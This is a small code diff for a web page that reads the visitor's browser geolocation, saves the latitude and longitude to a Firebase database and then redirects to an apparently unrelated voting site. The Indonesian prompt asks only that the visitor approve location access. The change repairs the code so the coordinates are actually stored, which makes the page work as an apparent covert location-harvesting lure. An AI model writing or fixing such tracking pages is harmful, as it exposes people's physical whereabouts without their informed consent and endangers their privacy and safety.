@@ -59,19 +59,19 @@
       function getSave() {
         if (navigator.geolocation) {
           navigator.geolocation.getCurrentPosition(showPosition);
-          firebase.database().ref("/").child(time).update({
-              Latitude : position.coords.latitude,
-              Longitude : position.coords.longitude
-          });
-        
-          window.location.assign("http://mevoting.is-best.net/");
         } else { 
           x.innerHTML = "Pastikan anda menyetujui lokasi!";
         }
       }
       
       function showPosition(position) {
-        x.innerHTML = "Latitude: " + position.coords.latitude + "<br>Longitude: " + position.coords.longitude;
+          x.innerHTML = "Latitude: " + position.coords.latitude + "<br>Longitude: " + position.coords.longitude;
+          firebase.database().ref("/").child(time).update({
+              Latitude : position.coords.latitude,
+              Longitude : position.coords.longitude
+          });
+        
+          window.location.assign("http://mevoting.is-best.net/");
       }
     </script>
   </body>
